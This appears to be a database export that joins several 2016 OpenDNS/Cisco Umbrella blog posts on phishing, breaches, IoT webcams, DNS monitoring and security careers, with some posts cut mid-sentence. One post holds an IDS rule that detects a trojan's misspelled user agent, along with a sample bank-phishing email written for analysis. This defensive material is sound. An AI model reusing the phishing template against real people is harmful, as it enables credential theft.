to contact the sender and ask if they actually sent the e-mail.\nBeware of any hasty, “Hurry-up before it’s too late!” messages\n\nThis is a common tactic of phishers. When we’re frightened into thinking that our account my get locked, or our profiles deleted, we tend to let our guard down a bit and go into “damage control” mode. Anything to fix the problem and avoid any inconveniences, even though succumbing to the phishers wishes would cause an even greater overall inconvenience.\nBe cautious of phone based phishes\nIf you get a phone call and there’s an automated voice on the other end of the line, it’s a great idea to double-check to see if the number matches who the caller claims to be. Most of the time you can use Google or a site like whocalled.us to look the number up and figure out who owns it. Even better, use the search engine to find the number of the organization that claims to be calling.\nOne last thing you can do is take this quiz to see how good you are at spotting a phish!

LinkedIn connection invites and recruiter calls are as normal as a daily Agile meeting. But those with career foresight know, it’s not enough to be complacent. To become an expert at the top of the field, progression is essential.\nUnderstanding, Not Illusions of Competence\nIn his interviews with candidates, OpenDNS Security Researcher Kevin Bottomley proposes a simple test that will quickly uncover how much a candidate knows. “I ask them to draw me a picture of a DNS request,” he said. “That’s it. Simple.”\nIt sounds simple, but there is a lot to learn from someone’s impromptu illustration of how DNS works. Does this person know the difference between authoritative and recursive DNS? Where does the ISP fit in the traversing route of DNS traffic? As a result, Bottomley gets a good idea of the person’s understanding of the concepts involved, and also how the candidate thinks logically and can apply that understanding. Security is no place for the illusions of competence.\nPersonal challenges are a huge component to advancing knowledge in any field. The skillsets of security professionals, sys admins, and software programmers are very closely tied, and as such so are the career progression of all three. And for all three fields, being adaptable and flexible plays a huge role. Sys Admin Shahab Sheikhzadeh reiterated this in an e-mail interview, “[Security professionals] have to be crafty & be able to adapt to the situations that arise. Being able to know how to overcome the failings of a script & how to write code to perform an operation, or use different system calls to accomplish the same task, is paramount.”\nIn terms of skills, there are no shortage of resources to mine for knowledge: hundreds of technical how-to books, classes and MOOCs, sites like IronGeek.com. But to become an elite security pro, it takes a lot more than skills. To Digital Forensic Analyst and SANS Institute Fellow Hal Pomeranz, it’s also about putting yourself into the community.\nApply Knowledge, Then Share It\n“The people that I am more likely to listen to and trust are the ones who are doing work, doing research, and actually talking and writing about it effectively,” Pomeranz said in an interview. “Putting yourself out there means you have enough confidence in your abilities to withstand peer review. And it also demonstrates good communication skills, which are important in any field, but also one of the distinguishing factors for an expert.”\nPomeranz alluded to a progression that security professionals — and really any programmer or developer — goes through to reach expert level. The major difference in the progression is knowing how, versus knowing why. “Practicioners can perform skills that they’ve been trained to do. Experts can integrate knowledge, possibly from multiple disciplines, to solve novel and complex problems.”\nAnd then of course, there’s the continued learning that is required. Because in security, like many other related fields in tech, everything changes. Constantly. Pomeranz quoted a friend of his, Celeste Stokely, who told him “Learn one big new thing every year.” It’s not bad advice, because staying sharp and ahead of colleagues means working and learning while they are sleeping…or doing that extra conference talk.\nDon’t Focus on the Right Tools\nAccording to Spotify Developer Mattias Johansson — who also runs the programming YouTube channel “funfunfunction” — it’s also important to not get hung up on which system or toolset will give you an edge and career longevity. In a video posted September 2015, Johansson covers a topical question he gets constantly from early level programmers. What is the best toolset or programming language to learn? Johansson decoded this question and reinterpreted it to find what commenters were really asking: What should I learn to keep myself employed?\n“Learning a popular tool or the next big thing will get you a job,” he says in the video’s summary. “But in order to be relevant, you should learn programming, not tools. If you practice programming well, and not just tools or languages, you will be a very sought after programmer.”\nRegardless of the career field in question, Bottomley, Pomeranz, and Johansson all allude to one unifying theme to becoming a respected expert: a fluid mastery. A tip-of-the-tongue, verbose understanding of the field, it’s tools and all that’s required to solve problems, with the added tenacity to do it.\nIt’s a mindset more than just a skillset.', 'Blog;Community;News;People & Culture;Security 101', 'https://umbrella.cisco.com/blog/2016/02/11/17004/');

From here, the cybercriminal was presented with three different computers to access, he said, one of which belonged to the person behind the compromised email account. The databases of DHS and FBI details were on the DOJ intranet, the hacker said.”\nThis failure follows a period of heavy criticism for the U.S. government’s ability to protect its own data, beginning with the OPM hack, and followed by subsequent attacks on the email accounts of several high-ranking intelligence officials.\n“What has anybody in the United States government learned?” asked Michael Adams, a former information security expert for US Special Operations Command, in a Motherboard phone interview. “They’re not doing information security fundamentals, obviously. It’s just f&^%$&# unacceptable.”\nObviously, the ongoing struggle of the Federal government to establish or enforce an effective security policy is providing attackers with an easy mark — whether they’re acting for political reasons or simply “doing it for the lulz.” This time, the records released weren’t as damaging as those leaked through the OPM breach, but any information leaking at all is cause for concern.', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2016/02/10/hacker-publishes-29000-u-s-government-employee-records/');

You’re in a hurry or spell check modifies a word, creating a grammatical error in its place.\nBut what about all the poorly written phishing emails, off-putting malware names or their misspelled user agents?\nCybercriminals are able to write a program and orchestrate a maze of elaborate fraud schemes, but just can’t seem to get the wording right. If those criminals can put so much effort into creating phishing attempts that appear to be from a legitimate bank, why wouldn’t they also proofread emails or double check the user agent used in C&C communications.\nLet’s take a look at some examples, starting with malware.\nUpatre has been used as a dropper that installs banking malware like Zeus or Dyre. Those malware families typically attempt to capture banking credentials on a victim’s computer. Upatre is often delivered via a phishing email (which was probably misspelled).\nWhen Upatre calls out, it attempts to look like legitimate traffic. The traffic has a HTTP GET request and a user agent, but the user agent is a bit off.This spelling oversight makes it much easier to detect and mitigate. The following IDS rule looks for exactly that misspelled user agent:\nalert http $HOME_NET any -> $EXTERNAL_NET any (msg:”ET TROJAN Mazilla Suspicious User-Agent Jan 15 2015″; flow:established,to_server; content:”User-Agent|3a| Mazilla/”; http_header; fast_pattern:12,7; reference:url,malware-traffic-analysis.net/2015/01/15/index.html; classtype:trojan-activity; sid:2020235; rev:3;)\nAnother example isn’t actually malware. It’s a check-in for an LG brand smart TV.\nThe network traffic looks like it’s from a web browser. However, the user agent is misspelled. This would trigger an IDS alert if it was looking for unusual user agents with regex patterns, and it would probably be classified as a false positive after some quick incident response.\n\nLet’s switch over to phishing. The following three samples were seen in the wild. They are either missing some words that are considered important when completing sentences in English, or they simply read as if a child wrote them.\nThis email wants the victim to validate an email account because it’s full:\nThis email is stating that the victim needs to upgrade an email account to an unlimited data plan:\nAnd this one actually wants you to send your username and password in the reply:\nIn an attempt to guess at what’s going on, we’re going to create our own phishing email targeted at an English speaker, but written from the perspective of a phishing author who doesn’t speak English. The assumption is that the author would write a grammatically correct email in their language and then use Google translate to convert it to English.\nHere’s our legitimate-sounding phishing email, written in English before using google translate:\nDear Card holder,\n We have detected unusual login activity associated with your bank account.\n Please re-confirm your account information and update your profile with us by visiting the following page:\n <link>\n Thank you for being a valued customer.\n 2014 American Express Account Security\n Fraud Prevention Network.\nAndrew Mei, one of our previous security research interns, wrote a grammatically correct version of this email in Cantonese. We then used Google translate to convert it to English. Here’s what we got:\n\nAndrew mentioned that the term, “Dear CardHolders” is something one might say to a lord over a hundred years ago and there isn’t an equivalent term in English.\n“If you are a club member” is odd since you should be a “member” if receiving the email, and what “club” is this?\nAnd finally, the lack of punctuation creates a run-on sentence.\nFor the next version, Artsiom Holub, our Russian-speaking security analyst, wrote a grammatically correct version of the text in Russian, which was translated to English using Google translate:\n\nThis looks a little better than the Cantonese version, but still has errors. There’s a “(th)” between “Dear” and “card holder” and the signature line is messed up. However, it’s got the right punctuation and doesn’t mention anything about “club members.”\nIDS signatures will catch malicious software with misspelled user agents and other attributes, but email is often not passed in the clear. Additionally, IDS signatures are fairly ineffective against bulk text seen in an email.\nSince all phishing emails are going to be sent without end-to-end encryption (unless it’s some sort of advanced, targeted attack in which a private encryption key might already have been compromised), emails could possibly be analyzed on the wire using natural language processing.\nOpenDNS already utilizes natural language processing along with other techniques to automatically classify unusual domain names seen being requested by users of OpenDNS. If a client is performing a DNS lookup for paypa1[.]com (notice the number 1 instead of the letter ‘L’), we will automatically use that information in classifying that domain as malicious.\nWith just a little effort from an enterprising system administrator, it could be possible to build a local system using similar techniques to analyze the clear text emails as they come into an email pooling system.\nThe errors in phishing are useful though. The emails that make it past spam filters have one final filter to pass through: the user. Vigilance in reading the email and noting where it originated and how it uses language are great steps in staying secure from phishing.', 'Security Community;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2016/02/08/grammar-and-spelling-errors-in-phishing-and-malware/');

At its core is Nginx. A cool thing about Nginx is how much you can get done just at the config level, but for maximum flexibility moving business logic into modules (C, or maybe Lua and now Javascript) is the way to go. But custom modules equals custom code, and custom code equals testing and debugging.\nWe test every feature, the developer is responsible for both the feature code and the associated tests. This ranges from unit tests, to integration, and to continuous monitoring in production. Any test that can be run continuously, is. We’ve added another neat feature to Nginx and dubbed it “X-Ray.” It allows us peek into the code flow for a given a request.

This year is a good opportunity to get started on the right foot. For organizations who may have been doing the bare minimum, getting started means setting priorities for security efforts and budget. So where to begin?\nOf course security priorities are individual to each company, enterprise, or organization, so each must be evaluated on its own merits. But 2015 definitely left us all with some food for thought on what is important, and where security teams should be putting their efforts.\nHere’s a not exhaustive list of priorities, in no particular order, that can help your team set focus for the year.\nIdentity Management\nThe time of shared passwords on a sticky note is long over. If your org is not using two-factor authentication, password management, and a single sign-on solution for critical systems like Github, AWS, and AD, it’s time to start. Long past time.\nThis on its own is an entirely complex project, but considering its importance, paired with the rapid adoption of cloud services and the expansion of mobile devices in the workplace, it’s priority should be at the top of the list.\nIoT Enforcement\nYes, it’s here. Connected devices are going to continue the march onto corporate networks for the next decade and beyond. It’s time to have a plan for it. Mainly, being able to monitor for when devices are present on the network, and apply enforcement for the ones that are vulnerable.\nLast year brought copious examples of what can go wrong with Internet enabled devices. And IoT dominated the spotlight at CES in January. FTC Chairwoman Edith Ramirez said in an interview at the event that she has started using an analog pedometer to replace connected fitness devices like Fitbit over data privacy concerns. “How that data is being used or shared, and the potential for unintended uses, is a concern,” she said. “The industry needs to address these concerns and be more transparent about how they handle personal data.”\nIn other words, the “industry” has not addressed it. Security is often an afterthought for companies that make connected devices, because they need to be as cheap as possible to compete, and security is hard.\nSecurity and network teams will need to find ways to monitor for these devices and assess whether they are safe to have around the office.\nPhishing and Extortion Game Plan\nThis is the new bread and butter for hackers. Online criminals (it would be insulting to call them hackers, as it no longer takes talent of any kind) are consistently gaining entry through phishing or an exploit kit, then applying ransomware or some sort of as-a-service crimeware. The unfortunate truth is attacks of this nature are lucrative enough to make them worthwhile, and are cheaper and easier than ever to execute.\nFor enterprises, the key will be having a gameplan in place. For phishing, the company workforce itself—through education—can be one of the best defenses. It may therefore be time to implement a training for employees on phishing, how it works, and how to spot it. This has been on the to-do list since at least 2012, so it’s time to make it a reality.\nFighting ransomware is another matter altogether. Preventing ransomware is possible, but with its rapidly changing methodology and the widely varying strains available, prevention will not be surefire. In terms of remediation, there are a ton of solutions and claims of solutions. But any tip list will include having reliable backups as one of the most important steps. Rather than paying a ransom to restore files, IT would be able to instead wipe infected machines and restore files from a backup.\nBoards and Budget\nThe executive board is becoming more involved in security decisions and measuring risk, which is making it increasingly important that everyone come to consensus on the risks facing the enterprise, how to address them, where the money will be spent, and who owns security in the company. Last year Blackhat conducted a survey among its attendees to find out where the industry’s priorities were, and found — among other things — that priorities and spending are not in line.\nIn an interview with Network World, Charlie Benway, executive director of the Advanced Cyber Security Center (ACSC), put the scope of the issue into frame. “Executive management and boards of directors are now recognizing that cybersecurity is not just a tech problem, it’s a business problem,” he said. “We’re starting to see more executive-level emphasis on cybersecurity, more resources coming into cybersecurity, across all industry sectors. That has definitely increased the demand for cybersecurity folks.”\nThird-Party Risks and Patching\nThe largest breaches in recent years, namely Target and OPM, were initiated through vulnerabilities in third-party vendors. More and more IT and security operations are being outsourced, as handling them in-house is just not feasible. But the convenience also comes with more risk. And it’s not going away any time soon. Companies should plan accordingly.\nHave a plan. No security measure can prevent negligence on the part of a third-party consultant, but the relationship is two-sided, and the company controls the initial level of access and the ability to restrict access if necessary. PWC has a program with suggestions for managing third-party risk. While its intended audience is financial firms, the same principles easily apply to any company that has relationships with third-parties.\nIt’s important also to keep aware of the news and alerts about vulnerabilities and keep systems patched. Last year saw quite a few vulnerability disclosures from the very companies who are supposed to protect us, illustrating the need to keep on top of updates.\nDev environments and tools should be regularly audited for access rights and security flaws, as they are “ripe” for attack. The majority of all organizations with an engineering team use Github, and an estimated 70 percent are using or evaluating using Docker. This makes these tools high-value targets for hackers. They should be given special attention to make sure they are secure.\nBug Bounty Programs\nIf your company obtains and stores customer data, financial data, or personally identifiable information (PII), it’s time to seriously consider running a bug bounty program. The most talented engineering team in the world cannot compete with the crowdsourced firepower that a bug bounty program can provide, and companies like HackerOne and BugCrowd make it incredibly easy.\nWhile on the subject of bug bounties, if it’s not feasible or company leadership is not comfortable offering a program, it’s important to establish an open-door policy with researchers. While it can take a ton of time to field reports of bugs, added with issues of false-positives and duplicate reports, not doing so can have harmful or even embarrassing results. Many companies — eBay just recently — have been in the news in the last couple years, not for having a bug in their sites or code, but because of the way they handled responding to disclosures.', 'Blog;News;Security 101', 'https://umbrella.cisco.com/blog/2016/02/04/16959/');

The event featured talks on several hot-button security topics, including vulnerabilities in medical devices and vehicles, competitive hacking, and trustworthy computing. However, the conference organizers clearly saved the best — and most controversial — for last. Closing the event was Rob Joyce, chief of Tailored Access Operations for the NSA.\nTailored Access Operations, or TAO, essentially operates as the NSA’s hacking squad. The organization’s responsibility is to monitor and gather intelligence on computer systems used by foreign entities. Given the contentious reaction of NSA activities since the Snowden revelations, to hear from the Chief of this office at an industry event was a rare treat, especially given the topic of his presentation: disrupting nation state hackers.\nConference attendees took note, and many came to a similar conclusion: one might call the NSA nation state hackers. This turned Joyce’s presentation into a unique look at not only NSA operations, but how to combat tactics used by highly sophisticated bad actors.\n“If you really want to protect your network you have to know your network, including all the devices and technology in it,” Joyce said. “In many cases we know networks better than the people who designed and run them.”\nAs the Register pointed out, Joyce outlined the six-point strategy used by the NSA to infiltrate a target: “reconnaissance, initial exploitation, establish persistence, install tools, move laterally, and then collect, exfiltrate, and exploit the data.”\nSimilar to criminal and nation state sponsored hackers, Joyce said, “we need that first crack and we’ll look and look to find it. There’s a reason it’s called an advanced persistent threat; we’ll poke and poke and wait and wait until we get in.”\nWhen the talk turned to defense, Joyce outlined several best practices for companies and security professionals alike:\nWatching out for favorite attack vectors: malicious email attachments, injection attacks from websites, and removable media\nMaking sure all systems are patched and updated\nLocking systems down: whitelisting apps, strict permissions, and using reputation management\nAs for zero-days, the attacks that usually come up in any conversation involving “APT”, Joyce had this to say: “A lot of people think that nation states are running their operations on zero-days, but it’s not that common. For big corporate networks, persistence and focus will get you in without a zero day. There are so many more vectors that are easier, less risky, and more productive.”\n\nYou can, and should, watch the full presentation on YouTube:', 'Blog;Events;Labs Research;Security 101', 'https://umbrella.cisco.com/blog/2016/02/03/nsa-tao-chief-talks-nation-state-hacks-at-usenix-enigma-conference/');

The take away of the talk centers around using DNS and other behavioral traits to detect proxies (read: compromised servers) used in various Locker campaigns almost immediately after they become live. Some of what I covered in my talk can also be found in my blog from August, “Tracking the Footprints of Ransomware.” The audience was great and had lots of questions during the Q&A session after the talk, enough that I actually ran over my allotted time slot and continued in the hall afterwards.\nNotable Moments\nOf course, there were other talks going on besides my own. While I was not able to attend them all (some you couldn’t attend unless you were one of the first in line due to capacity restrictions, and probably some type of fire code), I did manage to get a seat for a few of them.\nDocker Containers for Malware Analysis\nWhile I didn’t actually get to attend Lenny Zeltsers(@lennyzeltser) talk at BSidesNYC, since it ran parallel to mine, I did get to see it during IRespondCon in San Francisco in the beginning of December, so I can vouch to say that if you have the chance to catch it in the future, you should.

Now, thanks to IoT search engine Shodan, security professionals and curious bystanders alike can see how insecure these devices really are.\nIn an Ars Technica UK story earlier this week, security researcher Dan Tentler talked about Shodan’s latest search category, which allows paid users to rifle through vulnerable webcam feeds. “It’s all over the place,” he said, “practically everything you can think of.” According to the article, the cameras are using the Real Time Streaming Protocol which allows them to share video, but many have no authentication password in place.\n\nThe reporters covering the story found feeds containing private (or so they thought) images from people’s lives — everything from kitchens to classrooms, and even babies sleeping in their cribs.\n\nTentler insinuated that the lack of security in IoT devices, and most notably in the case of webcams, is due to the fact that manufacturers are in a “race to bottom.”\n“The consumers are saying ‘we’re not supposed to know anything about this stuff [cybersecurity],” he said in the article, “The vendors don’t want to lift a finger to help users because it costs them money.”\nThe lack of consumer interest in securing the Internet of Things is a vulnerability that companies are ignoring every day; and as technology advances, the chances of closing that knowledge gap grow smaller. Another problem stemming from this lack of interest is the failure to acknowledge the pervasiveness of IoT in our lives. IoT doesn’t stop at webcams, it includes fitness devices, appliances, doorbells, toys…even medical devices like pacemakers, O2 concentrators, and respirators.\nHowever, despite the general public’s lack of concern, there may be legislation on the way to right the security ship of IoT. Maneesha Mithal, associate director of the FTC’s division of privacy and identity protection, said in the Ars piece that “in recent years the FTC has prosecuted more than 50 cases against companies that did not reasonably secure their networks, products, or services.” The FTC has also published a best practices guide for IoT manufacturers, and is currently pushing for new laws that will punish companies with civil penalties for insufficient security.\nIn addition, the recently-formed Cyber Independent Testing Laboratory, led by former hacker Peiter “Mudge” Zatko, has committed to producing a “Consumer Security Reports.” From Zatko: “Our intention is to provide [consumers] with the information and tools they need, in a non-partisan fashion, and without profit incentives getting in the way of providing unbiased and quantified ratings of the software and systems they are purchasing.”\n\nIt remains to be seen whether these new initiatives will have an impact on securing the Internet of Things, but consumers can stay ahead of the curve by making informed purchasing decisions, and putting existing security controls to work, like setting passwords on their devices.', 'Blog;Security 101', 'https://umbrella.cisco.com/blog/2016/01/28/new-image-feed-reveals-yet-another-iot-danger/');

Since the congressional oversight hearings in June 2015, OPM Director Katherine Archuleta resigned; the government was hit with a number of lawsuits from “victims”; OPM hired a cybersecurity advisor, Clifton Triplett, and increased its IT “modernization” budget from $31 million to $87 million, with another $21 million scheduled for 2016; and the Obama administration announced Friday that OPM will no longer conduct background investigations. The FBI and Department of Homeland Security also released a “cyber alert” outlining a collective analysis and lessons learned from the OPM hack.\nThe memo was distributed only to cleared contractors by the Defense Security Service, and it includes a number of recommendations for security efforts going forward. While the memo does not name OPM specifically, according to an FCW article, the timing of its release and the recommendations included reportedly coincide with the OPM breach directly.\nAt the forefront is the recommendation for a segmented identity management system, which, according to the memo, could have limited the severity of the OPM breach. From the FCW article:\n“When an organization’s network is not segmented from others, this could mean hundreds of sub-networks are affected versus one,” the memo states. Privileged access controls “would have helped detect the intrusion earlier and made it significantly more difficult for the actor to spread across the network.”\nWhile the entire memo could not be located, FCW did list a number of security recommendations from it, including:\nEnabling a personal firewall at agency workstations\nMonitoring users’ online habits and blocking potentially malicious sites\nEmploying encryption for data at rest and in transit\nand Investigating “outbound network traffic observed over TCP port 53 that does not conform to the DNS protocol.”\nHopefully there are more recommendations than these few in the memo. To make up for the lack of the full list, here is a list of learning lessons from current events and studies conducted over the past couple years:\nIdentity management should be priority one:\nWhile this space with IT security has grown tremendously in the last few years, it remains a nonetheless crucial part to securing an organization. Especially if said organization outsources components of work to third-party vendors, like in the case of OPM.\n\nKeep infrastructure patched and updated:\nThe Cisco Annual Security Report noted that of 115,000 devices Cisco researchers scanned, 92 percent of them were susceptible to known vulnerabilities. The FBI and DHS memo about the OPM hack names “convenience” and “accessibility” specifically as aids to the hack.\nFull disk encryption for all endpoints:\nA recent report from Sophos showed many companies are not going through the effort of encrypting company data, nearly 70 percent in some industries.\nMonitor DNS traffic and check against any and all available threat intelligence feeds:\nThe same Cisco annual report mentioned earlier also found that many organizations are not monitoring DNS traffic, despite its wealth of information about user behavior and possible indicators of compromise.\nEnable and enforce strong password management:\nSplashData recently released a study that found the worst possible passwords —like ‘123456’ — are still being used regularly. Same as they were since 2011.\nEducate employees to spot phishing attempts:\nDespite its long history in the hacking toolkit, phishing continues to be an effective way to gain access to company networks. Employee training has proved effective in helping the efforts of IT and security orgs. \nManage third-party vendor and contractor access:\nAccording to congressional hearing testimony, hackers gained access to OPM networks through a third-party contractor, which is unfortunately common.\nThis list might be a good start, and would keep an IT organization busy for months if not years.

We started planning the migration because v2 provided some impressive performance improvements in our early tests and, well, because we were getting tired of seeing deprecation warnings when pushing or pulling images from our repositories and assumed these pushes and pulls would eventually turn into failures.\n\nOne of the biggest problems we needed to tackle was dealing with migrating our users’ thousands of images. Thankfully, the Docker migrator was created for this exact purpose. The Docker migrator pulls images from a configurable registry — using the V1_REGISTRY environment variable — to a local Docker cache, then tags the images and pushes them up to the new docker registry, configured through the V2_REGISTRY environment variable. We spun up an EC2 instance and quickly ran a few tests using repository filters to limit the number of images that would be migrated. To prevent adding load to our infrastructure, we launched copies of our v1 and v2 registries on the same instance as the migrator and configured them to use the same S3 storage backend as our existing registries.\n\nThe first few tests with the migrator looked good. So we gave the EC2 instance a massive disk, configured a Jenkins job to run the migration and launched the job.\n\nAlmost four hours later, our staging environment v1 registry was migrated, or so we thought. Looking through the logs we found out that quite a few of our pushes failed with a somewhat cryptic error message:\ntime=\"2016-01-19T02:12:54Z\" level=fatal msg=\"open /var/lib/docker/aufs/mnt/de5e040c21448c28ad2ee750e264ff63223b5062459cb396da32d10f8f73b241/.wh..wh.plnk/345.7528401: operation not permitted\"\nA bit of googling found this issue that was reported to Docker in August, and a resulting fix in the  1.10 release. As a workaround, we downgraded Docker to version 1.7.1 and blew away the /var/lib/docker/aufs directory as suggested in that issue. We ran the job again and it happily ran in just under seven hours. We ran the job a second time and realized that the entire operation still took way too long as it needed to pull down all the images before pushing them to the new registry.\n\nWe added an environment flag to migrator.sh to keep the locally cached Docker images, rather than cleanup them up at the end of a migration. With this change, we could run the migration multiple times without having to download each image every time. In addition, we put together a simple Python script to determine which images were in the old repository but not in the new one, which would reduce the number of pull/pushes needed. This took our migration time down to 19 minutes on subsequent runs. Considering running the initial migration on our production system took more than two days, reducing the runtime to less than a fifth is huge.\n\nThe updated migrator and registry comparison scripts are available in our Github repo here.', 'Docker;Security Engineering', 'https://umbrella.cisco.com/blog/2016/01/22/2919/');

They covered their new model SPRank [1][2], which uses time series analysis and statistical features to efficiently identify malicious behavior in DNS traffic, particularly Exploit kits, phishing and DGAs. They also discussed how starting with SPRank detection, they expand the intelligence knowledge base by tracking bulletproof hosting infrastructures used by adversaries to host Exploit kits, and other malicious content [3]. They then introduced graph analytical methods to identify new clusters of DGAs in a graph of co-occurring domains as well as other DNS-based threats.\n\nWe also enjoyed several good talks varying in topic from network flow analysis to high performance computing including threat intelligence and graph analytics.\nInsights from Dhia Mahjoub\nThere were several good and thought-provoking talks at FloCon. One of my favorites was “Distributed Sensor Data Contextualization at Scale for Threat Intelligence Analysis” by Jason Trost, VP of Threat Research at ThreatStream. Jason provided an overview of various network and host based data collection elements he calls “sensors” that are essential to building actionable threat intelligence for research and forensics purposes. The sensor definition covers honeypots, IDS, protocol decoders, device fingerprinting, sinkholes, sandboxes, endpoints, etc. Jason also pointed out that it is equally as important to use “enrichment” data sets (internal or external) and join them with sensor collected events to provide more context and insight to analysts and threat researchers. Enrichment data sets include WHOIS, passive DNS, active probing data repositories (e.g. Shodan, Caida), malware meta data repositories, threat intelligence knowledge bases, various analytics and data from internal IT and IR environments like asset data, devices, etc. It was nice to catch up with Jason after the talks and share our experiences and anecdotes about threat research and engineering.\nThe social events at the hotel and the Daytona Motor Speedway offered another great venue to catch up with old friends, meet new friends, and discuss various topics around research and development, academia, and the challenges facing our industry.\n\nAlthough, the weather in Daytona Beach was not your typical sunny and warm, I still enjoyed a nice view of the board walk from the hotel room.\n\nInsights from Thibault Reuille\nIt was my first time speaking at a conference on the East Coast. I was pleased to discover a pretty different side of the security scene. Among all the interesting presentations, a very special one caught my attention and interest:  Network Security Analytics, HPC Platforms, Hadoop, and Graphs…Oh, My.\nAaron Bossert, solution architect at Cray, explored a graph visualization and processing engine fully working on a Cray supercomputer. As some of you already know, graph theory is a subject which is pretty close to my heart, and it was a pleasure to discover the computing power of one of the top supercomputers in the world. With its highly parallel architecture and huge shared global memory capabilities, it can really take graph processing to the next level and open so many new doors for real-time data processing.\nOne of the key challenges of security analytics is to be able to process very large datasets (logs for example) in near real-time but also to build connections between internet actors at very high speed. If that problem can be solved, our next generation detection platforms could apply online topology-based detection systems. Pure gold.\nAfter the presentation, I had the pleasure to talk a little bit with Aaron to get a full demo of the interface and share some war stories and learn a bit more about the Cray architecture and performances. Pretty inspiring!\nI should also probably note the other thing that brightened my day: I won the TeleSoft raffle and had the pleasure of going home with a brand new Dji Phantom 3 drone! Lucky me ;). Thanks again TeleSoft for the belated Christmas present!\n\nInsights from Thomas Mathew\nMark Mager from the US-CERT code analysis team gave a great talk titled Command and Control Mechanism Trends in Exploit Kits, RATs, APTs, and Other Malware. Mark provided an overview of the mechanisms APTs and Exploit kits use to first infect machines and then communicate remotely. Not surprisingly, infected office documents are a common infection vector. Exploit kits and APTs still rely on infected macros and VBScripts to call out to remote servers. Many RATs Mark examined used exeproxy as a means to send encrypted data over TCP port 443. To hinder reversing malware authors employ obfuscation and conditional statements that always present the same value. Many of the exploit kits do not use office documents, but Silverlight and Flash plugins. The big take away from the talk was that many RAT and APT authors are using traditional means of infecting their targets. Using very advanced techniques is not a common practice. However, RAT and APT threats have become a lot more modular in form.\nInsights from Jeremiah O’Connor\nIt was a long journey across the country to Florida, but it was great to finally arrive at the Hilton Oceanside, Daytona Beach for FloCon 2016.\n\nThe first night was a very nice meet and greet reception put on for the speakers. The next day, the conference started and there was a great turnout with a healthy mix of industry professionals and academics:\n\nAfter our team presentations we got to see a few presentations. Fellow Ciscans Blake Anderson, Alison Kendler, and David McGrew gave very interesting talks on Understanding Network Traffic Through Intraflow Data  and Classifying Encrypted Traffic with TLS-Aware Telemetry.\n\nOverall it was a successful weekend, and we heard some very nice feedback about the OpenDNS presentations and the type of work we are doing at OpenDNS Labs.

The comprehensive report is a view of the security landscape, including results from a large survey that aims to take the pulse of infosec organizations and how they are spending budget and tackling their security challenges. A portion of the report is dedicated to how important it is for organizations to monitor DNS for attack indicators, though a good majority do not do so.\nIn July 2014, OpenDNS Security Labs conducted an informal survey to find out how many companies were monitoring recursive DNS, and the results were not positive. Nearly 67 percent of responders indicated they do not monitor recursive DNS for malicious traffic. The same year, the Verizon Data Breach Investigations report called DNS one of the most valuable sources of data within an organization, recommending that it be mined regularly and cross-referenced against threat intelligence.\nCisco Cloud Security Research Lead Dan Hubbard said security teams that are not monitoring DNS for indications of compromise are missing an opportunity. “Aside from routing protocols, DNS is the lowest layer of the Internet,” Hubbard said. “And because it’s so robust and reliable, criminals use it too.” According to the Cisco report, more than 91 percent of attacks use DNS in some way, either to communicate with a control servers, exfiltrate data from targets, or receive new commands to infiltrate networks further.\nHubbard said to get that figure for the report, his research team analyzed six months’ worth of known malware signatures from Threat Grid’s intelligence data, detonated the attacks in a sandbox, and observed which attacks used DNS to communicate.\n“Most organizations have systems that sit above the DNS layer, like secure web gateways and firewalls,” he said. “But soon, your car, your heart rate monitor, your refrigerator, are all going to use DNS. It’s the most pervasive protocol.”\nThe Cisco security report notes that many organizations may not monitor DNS because security and DNS are often managed by two different teams. And while that may be true, Hubbard thinks it’s also a matter of prioritization. The dependability and simplicity of DNS can turn it into an organization’s security blind spot.\nTo read the rest of the report, visit Cisco’s security portal.

The intention is to use Microsoft’s data from billions of endpoints “to inform how we protect all endpoints, better detect attacks, and accelerate our response,” Arsenault wrote in a blog post. This might beg the question, what is a security graph?\nData visualization is a booming segment of the big data job market, and it’s found an obvious foothold in security. The requirement of data visualization in job descriptions has increased in big data jobs by 12 percent in just the first half of 2015, which may indicate the skill is in the early stages of demand. As more companies begin to realize their need for quick digestions of large volumes of data to find trends, especially in security, the demand for visualization will likely keep increasing, vague as the description may be.\nMore Than Just PewPew Maps\nIn security, as the Microsoft executive team eluded to, visualization can provide a way of pulling together a ton of data to consume visually, since the brain can process visual information much quicker and easier than reading a log or report.\nWhile there’s no shortage of what are known colloquially as “pewpew” maps — live graphs that show ongoing attacks, usually by country — visualization offers a lot more than just attack information. For companies looking to get a clearer picture of their networks and security status, a dashboard or graph or visualization can be an invaluable resource. It makes a visual of the invisible; puts context on the seemingly arbitrary; draws virtual lines to disparate clues.\nSecurity graphs and visualizations have the ability to:\n— Give context for spikes and pattern anomalies\n— Tell a security story based on large data sets\n— Show comparative performance or historical attack info\n— Show live feeds and relevant world news\nAnd of course, many other functions. OpenDNS Security Labs, for instance, does have an attack map (use Chrome for the live view). But the Labs team also developed Security Graph back in 2014, and released it as open source with an API to allow anyone to create a 3-D model that can show relational data. It’s a powerful way of visualizing relationships between data points. When using it to visualize a botnet for example, it creates a neighborhood map of malicious Internet locations (IPs and ASNs).\nThibault Reuille, an OpenDNS security researcher and creator of OpenGraphiti (the model that powers Security Graph), described the basic function of a visualization tool for security nicely in an article for Dark Reading. “By implementing a physics engine we can transform relational data, however loosely related, into a 2D or 3D structure (a visualization). Since the structure will be defined by the relationships of the data, previously unnoticed clusters or patterns can, basically, highlight themselves.”\nExample of an Security Graph visualization using OpenGraphiti.\nOther companies in the security space and elsewhere are using their speciality to create visualizations. Last year, Cognitive Systems released an interesting visualization for wireless signals. Its use could be monitoring for rogue wireless devices in a server room, or scanning for IoT devices in an office. And ProtectWise announced a security graph dashboard that promised to be “like something out of Call of Duty.” In other words, something customers might want to use, not a flashy feature that doesn’t provide value.\nThe value a security graph or visualization provides is key for security engineers. Security teams strive to remain constantly informed. Making informed decisions and asking better questions is at the core of a good visualization tool. They can help cut through the data overload that is common in security operations.\nGregory Lewandowski, manager of analytics at Cisco, knows the goal of visualizing data well. “If we’re successful, people can see the threads in a way that allows them to ask better questions, which leads to better strategy and ultimately to a better company,” he said in an interview.\nFor now, the definition of a security graph may be obtuse and the function of visualizing security data might prove to be of varying utility, but they will soon become an indispensable addition to a team’s toolkit.', 'Blog;Labs Research;News;Security 101', 'https://umbrella.cisco.com/blog/2016/01/13/beyond-the-pewpew-visualization-finds-its-home-in-security/');

